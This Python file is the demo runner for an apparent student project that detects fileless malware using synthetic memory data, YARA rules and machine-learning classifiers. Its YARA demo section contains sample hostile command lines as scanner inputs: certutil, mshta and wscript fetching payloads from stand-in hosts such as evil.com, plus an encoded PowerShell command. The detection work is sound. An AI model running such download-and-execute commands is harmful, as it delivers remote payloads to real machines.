"""
main.py
End-to-end demo runner for Intelligent RAM Analysis Using ML for Detection
and Prevention of Fileless Malware.

Phases:
  1. Data Generation   — Synthetic Volatility-style process/memory data
  2. Feature Engineering — Behavioral and memory feature extraction
  3. YARA Scanning     — Signature-based pattern matching
  4. ML Training       — Random Forest + GBT + SVM classifiers
  5. Hybrid Detection  — Combined YARA + ML pipeline on test set
  6. Visualization     — Dashboard, ROC, confusion matrix, feature importance
"""

import sys
import os
import time
import warnings
warnings.filterwarnings('ignore')

# Ensure src/ is importable
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
    from rich.text import Text
    from rich import box
    RICH = True
except ImportError:
    RICH = False

import numpy as np
import pandas as pd

from src.data_generator import generate_dataset, save_dataset
from src.feature_extractor import get_feature_matrix, get_feature_importance_labels
from src.yara_engine import YaraEngine, get_yara_features
from src.ml_models import (train_and_evaluate, cross_validate_model,
                           get_feature_importance, save_best_model, load_model)
from src.hybrid_detector import HybridDetector
from src.visualizer import (plot_confusion_matrix, plot_roc_curves, plot_model_comparison,
                            plot_feature_importance, plot_detection_dashboard, plot_cv_scores)


console = Console() if RICH else None


def banner():
    if RICH:
        console.print(Panel.fit(
            "[bold cyan]Intelligent RAM Analysis Using ML[/bold cyan]\n"
            "[white]Detection and Prevention of Fileless Malware[/white]\n\n"
            "[dim]DSCE — Dept. of CSE (Cyber Security) | AY 2025-26[/dim]\n"
            "[dim]Team: Meghana | Mounika | Parvati | Puneetha[/dim]\n"
            "[dim]Guide: Dr. Deepthi V S[/dim]",
            title="[bold yellow]◈ FILELESS MALWARE DETECTOR ◈[/bold yellow]",
            border_style="cyan",
        ))
    else:
        print("=" * 65)
        print("  Intelligent RAM Analysis Using ML for Fileless Malware Detection")
        print("=" * 65)


def section(title: str, color='bold blue'):
    if RICH:
        console.print(f"\n[{color}]{'─'*60}[/{color}]")
        console.print(f"[{color}]  {title}[/{color}]")
        console.print(f"[{color}]{'─'*60}[/{color}]\n")
    else:
        print(f"\n{'─'*60}")
        print(f"  {title}")
        print('─'*60)


def log(msg, style=''):
    if RICH:
        console.print(f"  {msg}" if not style else f"  [{style}]{msg}[/{style}]")
    else:
        print(f"  {msg}")


def phase1_data_generation():
    section("PHASE 1 — Memory Data Generation (Volatility Simulation)", "bold cyan")
    log("Simulating Volatility memory forensics output...")
    log("Attack types: Process Hollowing | LOLBin Abuse | DLL Injection | PS Encoded | WMI Exec")

    df = generate_dataset(n_benign=1500, n_malicious=500, seed=42)
    path = save_dataset(df, 'data/memory_process_data.csv')

    n_malicious = df['label'].sum()
    n_benign = (df['label'] == 0).sum()

    if RICH:
        tbl = Table(title="Dataset Summary", box=box.ROUNDED, border_style='cyan')
        tbl.add_column("Metric", style='bold white')
        tbl.add_column("Value", style='green')
        tbl.add_row("Total Samples", str(len(df)))
        tbl.add_row("Benign Processes", str(n_benign))
        tbl.add_row("Malicious Processes", str(n_malicious))
        tbl.add_row("Features (raw)", str(len(df.columns) - 1))
        tbl.add_row("Saved to", path)
        console.print(tbl)
    else:
        print(f"  Total: {len(df)} | Benign: {n_benign} | Malicious: {n_malicious}")

    return df


def phase2_feature_engineering(df):
    section("PHASE 2 — Feature Extraction & Engineering", "bold cyan")
    log("Extracting behavioral, memory, and process features...")

    X, y, feature_names = get_feature_matrix(df)

    log(f"Feature matrix shape: [bold]{X.shape}[/bold]" if RICH else f"Feature matrix: {X.shape}")
    log(f"Engineered features added: handles_per_thread, dll_load_ratio, behavioral_score, ...")

    if RICH:
        tbl = Table(title="Feature Statistics", box=box.SIMPLE, border_style='dim')
        tbl.add_column("Feature Group", style='bold white')
        tbl.add_column("Count")
        tbl.add_row("Process Behavior Features", "12")
        tbl.add_row("Memory Artifact Features", "8")
        tbl.add_row("Engineered/Derived Features", "7")
        tbl.add_row("YARA Integration Features", "1")
        tbl.add_row("[bold green]Total[/bold green]", f"[bold green]{X.shape[1]}[/bold green]")
        console.print(tbl)

    return X, y, feature_names


def phase3_yara_scanning(df):
    section("PHASE 3 — YARA Signature Scanning", "bold cyan")
    log("Running YARA rule engine over process command lines...")

    engine = YaraEngine()

    # Demo on a few interesting cases
    demo_cases = [
        ('powershell.exe', '-EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY...'),
        ('svchost.exe', 'C:\\Windows\\system32\\svchost.exe -k netsvcs'),
        ('certutil.exe', 'certutil -urlcache -split -f http://evil.com/shell.exe shell.exe'),
        ('mshta.exe', 'mshta http://attacker.com/payload.hta'),
        ('explorer.exe', 'C:\\Windows\\Explorer.EXE'),
        ('wscript.exe', 'wscript.exe //e:jscript http://malware.ru/run.js'),
    ]

    if RICH:
        tbl = Table(title="YARA Scan Results (Sample)", box=box.ROUNDED, border_style='yellow')
        tbl.add_column("Process", style='white')
        tbl.add_column("YARA Hits")
        tbl.add_column("Max Severity")
        tbl.add_column("Rules Triggered", style='dim')

        for name, cmd in demo_cases:
            result = engine.scan_process(name, cmd)
            sev = result['max_severity']
            sev_color = {'CRITICAL': 'red', 'HIGH': 'yellow', 'MEDIUM': 'cyan',
                         'NONE': 'green'}.get(sev, 'white')
            tbl.add_row(
                name,
                str(result['hit_count']),
                f"[{sev_color}]{sev}[/{sev_color}]",
                ', '.join(result['matched_rules'][:2]) or '—',
            )
        console.print(tbl)
    else:
        for name, cmd in demo_cases:
            result = engine.scan_process(name, cmd)
            print(f"  [{name}] Hits={result['hit_count']} Severity={result['max_severity']}")

    log(f"YARA rules loaded: [bold]{len(engine.rules)}[/bold] rules across 6 categories" if RICH
        else f"YARA rules: {len(engine.rules)}")

    return engine


def phase4_ml_training(X, y, feature_names):
    section("PHASE 4 — ML Model Training & Evaluation", "bold cyan")
    log("Training: Random Forest | Gradient Boosting | SVM | Ensemble")
    log("Running 5-Fold Cross Validation on Random Forest...")

    cv_scores = cross_validate_model(X, y, n_splits=5)
    cv_path = plot_cv_scores(cv_scores)
    log(f"CV F1: {cv_scores.mean():.4f} ± {cv_scores.std():.4f}  →  saved: {cv_path}")

    log("Training all models on 80% train / 20% test split...")
    results, fitted_models, X_test, y_test = train_and_evaluate(X, y)

    if RICH:
        tbl = Table(title="Model Evaluation Results", box=box.ROUNDED, border_style='green')
        tbl.add_column("Model", style='bold white')
        tbl.add_column("Accuracy", justify='right')
        tbl.add_column("Precision", justify='right')
        tbl.add_column("Recall", justify='right')
        tbl.add_column("F1-Score", justify='right')
        tbl.add_column("ROC-AUC", justify='right')
        tbl.add_column("FPR", justify='right')

        for name, m in results.items():
            tbl.add_row(
                name,
                f"{m['accuracy']:.4f}",
                f"{m['precision']:.4f}",
                f"{m['recall']:.4f}",
                f"[bold green]{m['f1']:.4f}[/bold green]",
                f"{m['roc_auc']:.4f}",
                f"[{'red' if m['false_positive_rate'] > 0.05 else 'green'}]"
                f"{m['false_positive_rate']:.4f}[/]",
            )
        console.print(tbl)
    else:
        for name, m in results.items():
            print(f"  {name}: Acc={m['accuracy']:.4f} F1={m['f1']:.4f} AUC={m['roc_auc']:.4f}")

    # Generate plots
    log("Generating evaluation plots...")
    roc_path = plot_roc_curves(results)
    comp_path = plot_model_comparison(results)
    best_model_name = max(results, key=lambda k: results[k]['f1'])
    cm_path = plot_confusion_matrix(results[best_model_name]['confusion_matrix'], best_model_name)

    # Feature importance
    rf_model = fitted_models.get('Random Forest')
    if rf_model:
        fi_df = get_feature_importance(rf_model, feature_names)
        labels_map = get_feature_importance_labels()
        fi_path = plot_feature_importance(fi_df, labels_map=labels_map)
        log(f"Feature importance plot saved → {fi_path}")

    log(f"Best model: [bold green]{best_model_name}[/bold green]" if RICH else f"Best: {best_model_name}")
    log(f"ROC curves → {roc_path}")
    log(f"Confusion matrix → {cm_path}")

    # Save model
    best_name, model_path = save_best_model(fitted_models, results, feature_names)
    log(f"Model saved → {model_path}")

    return results, fitted_models, X_test, y_test


def phase5_hybrid_detection(df, engine):
    section("PHASE 5 — Hybrid Detection Pipeline (YARA + ML)", "bold cyan")
    log("Loading saved model, running hybrid detection on test processes...")

    model_bundle = load_model()
    detector = HybridDetector(model_bundle, engine, ml_weight=0.6, yara_weight=0.4)

    # Use a sample of 200 processes for demo speed
    sample_df = df.sample(n=200, random_state=7).reset_index(drop=True)
    results = detector.batch_detect(sample_df)
    summary = detector.summarize_results(results)

    if RICH:
        tbl = Table(title="Hybrid Detection Summary", box=box.ROUNDED, border_style='red')
        tbl.add_column("Metric", style='bold white')
        tbl.add_column("Value", style='bold')
        tbl.add_row("Total Processes Scanned", str(summary['total_processes']))
        tbl.add_row("Malicious Detected", f"[red]{summary['malicious_detected']}[/red]")
        tbl.add_row("Benign Processes", f"[green]{summary['benign']}[/green]")
        tbl.add_row("Detection Rate", f"{summary['detection_rate']*100:.1f}%")
        tbl.add_row("Avg Hybrid Score (Malicious)", f"{summary['avg_hybrid_score_malicious']:.4f}")
        console.print(tbl)

        # Top 5 threat processes
        threats = summary['top_threats'][:5]
        if threats:
            t_tbl = Table(title="Top Threat Processes", box=box.SIMPLE, border_style='dim red')
            t_tbl.add_column("Process", style='yellow')
            t_tbl.add_column("PID")
            t_tbl.add_column("Risk")
            t_tbl.add_column("Hybrid Score")
            t_tbl.add_column("YARA Rules")
            for r in threats:
                risk_color = {'CRITICAL': 'red', 'HIGH': 'yellow', 'MEDIUM': 'cyan', 'LOW': 'green'}.get(
                    r.risk_level.value, 'white')
                t_tbl.add_row(
                    r.process_name,
                    str(r.pid),
                    f"[{risk_color}]{r.risk_level.value}[/{risk_color}]",
                    f"{r.hybrid_score:.4f}",
                    ', '.join(r.matched_rules[:2]) or '—',
                )
            console.print(t_tbl)
    else:
        print(f"  Malicious: {summary['malicious_detected']} / {summary['total_processes']}")

    return results, summary


def phase6_visualization(results, summary):
    section("PHASE 6 — Dashboard & Visualization", "bold cyan")
    log("Generating detection dashboard...")

    path = plot_detection_dashboard(results, summary)
    log(f"Dashboard saved → [bold]{path}[/bold]" if RICH else f"Dashboard → {path}")

    if RICH:
        console.print(Panel.fit(
            "[bold green]All reports saved to the [cyan]reports/[/cyan] directory:[/bold green]\n"
            "  • reports/detection_dashboard.png\n"
            "  • reports/roc_curves.png\n"
            "  • reports/model_comparison.png\n"
            "  • reports/confusion_matrix_*.png\n"
            "  • reports/feature_importance.png\n"
            "  • reports/cross_validation.png",
            title="[bold]Reports Generated[/bold]",
            border_style='green',
        ))


def main():
    banner()

    start = time.time()

    # Phase 1: Data
    df = phase1_data_generation()

    # Phase 2: Features
    X, y, feature_names = phase2_feature_engineering(df)

    # Phase 3: YARA
    engine = phase3_yara_scanning(df)

    # Phase 4: ML
    results, fitted_models, X_test, y_test = phase4_ml_training(X, y, feature_names)

    # Phase 5: Hybrid
    detection_results, summary = phase5_hybrid_detection(df, engine)

    # Phase 6: Visualize
    phase6_visualization(detection_results, summary)

    elapsed = time.time() - start

    if RICH:
        console.print(Panel.fit(
            f"[bold green]End-to-end pipeline completed in {elapsed:.1f}s[/bold green]\n"
            f"[dim]Run [cyan]python demo_scan.py[/cyan] for the interactive live scan demo[/dim]",
            title="[bold cyan]Demo Complete[/bold cyan]",
            border_style='cyan',
        ))
    else:
        print(f"\nCompleted in {elapsed:.1f}s")
        print("Run: python demo_scan.py  for live scan demo")


if __name__ == '__main__':
    main()
